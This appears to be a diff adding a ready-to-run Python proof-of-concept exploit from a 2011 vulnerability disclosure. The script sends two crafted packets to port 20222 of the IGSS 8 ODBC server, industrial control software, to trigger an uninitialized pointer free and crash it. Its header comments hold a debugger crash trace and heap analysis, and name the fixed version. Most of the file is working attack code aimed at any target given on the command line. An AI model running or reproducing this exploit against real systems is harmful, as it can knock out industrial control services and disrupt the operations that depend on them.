@@ -1,0 +1,125 @@
+#!/usr/bin/python
+# igss.py
+# IGSS 8 ODBC Server Multiple Remote Uninitialized Pointer Free DoS
+# Jeremy Brown / jbrown at patchtuesday dot org
+# Mar 2011
+#
+# There are multiple remote uninitialized pointer free conditions in IGSS's ODBC
+# server. By sending a specially crafted packet to listening port 20222, it is
+# possible to crash the server. Execution of arbitrary code is unlikely.
+#
+# Note: IGSS uses a 3rd party ODBC driver kit from Dr. DeeBee.
+#
+# HEAP[Odbcixv8se.exe]: Invalid allocation size - 8899AABB (exceeded 7ffdefff)
+# HEAP[Odbcixv8se.exe]: Invalid Address specified to RtlGetUserInfoHeap( 00150000, 00175008 )
+# (f10.cf8): Break instruction exception - code 80000003 (first chance)
+# eax=00175000 ebx=00175000 ecx=7c91ead5 edx=0102fc55 esi=00150000 edi=00175008
+# eip=7c90120e esp=0102fe58 ebp=0102fe5c iopl=0         nv up ei pl nz na po nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+# ntdll!DbgBreakPoint:
+# 7c90120e cc              int     3
+# 0:002> g
+# HEAP[Odbcixv8se.exe]: Invalid Address specified to RtlGetUserInfoHeap( 00150000, 00175008 )
+# (f10.cf8): Break instruction exception - code 80000003 (first chance)
+# eax=00175000 ebx=00175000 ecx=7c91ead5 edx=0102fc55 esi=00150000 edi=00175008
+# eip=7c90120e esp=0102fe58 ebp=0102fe5c iopl=0         nv up ei pl nz na po nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+# ntdll!DbgBreakPoint:
+# 7c90120e cc              int     3
+# 0:002> g
+# Heap corruption detected at 00175008
+# Heap corruption detected at 00177F78
+# Heap corruption detected at 001733D8
+# (f10.cf8): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=00173398 ebx=00000000 ecx=feeefeee edx=001733d8 esi=00173390 edi=00150000
+# eip=7c9276fc esp=0102fc34 ebp=0102fd08 iopl=0         nv up ei pl zr na pe nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+# ntdll!RtlFreeHeapSlowly+0x392:
+# 7c9276fc 8901            mov     dword ptr [ecx],eax  ds:0023:feeefeee=????????
+# 0:002> kb
+# ChildEBP RetAddr  Args to Child              
+# 0102fd08 7c96f85a 00150000 50000061 00173398 ntdll!RtlFreeHeapSlowly+0x392
+# 0102fd7c 7c94bc4c 00150000 50000061 00173398 ntdll!RtlDebugFreeHeap+0x193
+# 0102fe64 7c927573 00150000 40000061 00173398 ntdll!RtlFreeHeapSlowly+0x37
+# 0102ff34 7c80fd4f 00150000 00000001 00173398 ntdll!RtlFreeHeap+0xf9
+# *** ERROR: Module load completed but symbols could not be loaded for Odbcixv8se.exe
+# 0102ff7c 0044531d 00aa001c 0102ffb4 00443abd kernel32!GlobalFree+0xb5
+# WARNING: Stack unwind information not available. Following frames may be wrong.
+# 0102ff88 00443abd 00173398 00000014 00000016 Odbcixv8se+0x4531d
+# 0102ffb4 7c80b729 00000710 00000000 00000000 Odbcixv8se+0x43abd
+# 0102ffec 00000000 004436f0 00000710 00000000 kernel32!BaseThreadStart+0x37
+#
+# feeefeee = freed memory
+#
+# RtlFreeHeap() takes three arguments:
+# HeapHandle --> 0x173398
+# Flags      --> 0x00000001
+# HeapBase   --> 0x173398
+#
+# HeapBase is the pointer to the memory block that is going to be freed.
+#
+# 0:002> dd 173398
+# 00173398  001733d8 -----------------------------
+# 001733a8  feeefeee feeefeee feeefeee feeefeee  -
+# 001733b8  feeefeee feeefeee feeefeee feeefeee  -
+# 001733c8  feeefeee feeefeee feeefeee feeefeee  -
+# 001733d8  feeefeee feeefeee feeefeee feeefeee <-
+# 001733e8  feeefeee feeefeee feeefeee feeefeee
+# 001733f8  feeefeee feeefeee feeefeee feeefeee
+# 00173408  feeefeee feeefeee feeefeee feeefeee
+#
+# In this example, the pointer to free happens to point to free memory.
+#
+# Tested IGSS 8 (Odbcixv8se.exe version 10299) on Windows
+#
+# Fixed version: IGSS 8 (Odbcixv8se.exe version 11003)
+# http://www.syware.com/download/drdeebee/gold_bug.txt
+#
+
+import sys
+import socket
+
+req_1=(
+"\x00\x00\x00\x34"
+"\x02\x00\x00\x00\x02\x00\x00\x00\x02\x2e\x00\x00\x00\x00\x19\x49"
+"\x47\x53\x53\x33\x32\x76\x38\x20\x4f\x44\x42\x43\x20\x4e\x65\x74"
+"\x77\x6f\x72\x6b\x20\x44\x53\x00\x00\x00\x00\x02\x20\x00\x00\x00"
+"\x00\x02\x20\x00"
+)
+
+req_2=(
+"\x00\x00\x00\xff"+  # length
+"\x16"+              # switch code
+"\x77" * 254+        # begin query here
+"\x88\x99\xaa\xbb"   # test
+)
+
+if len(sys.argv)!=2:
+     print "Usage: %s <target>" % sys.argv[0]
+     sys.exit(0)
+
+target=sys.argv[1]
+port=20222
+cs=target,port
+
+sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+sock.connect(cs)
+sock.settimeout(1)
+
+sock.send(req_1)
+
+try:
+     resp=sock.recv(1024)
+     print "resp_1 = %s\n"%resp.encode("hex")
+except: pass
+
+sock.send(req_2)
+
+try:
+     resp=sock.recv(1024)
+     print "resp_2 = %s\n"%resp.encode("hex")
+except: pass
+
+sock.close()
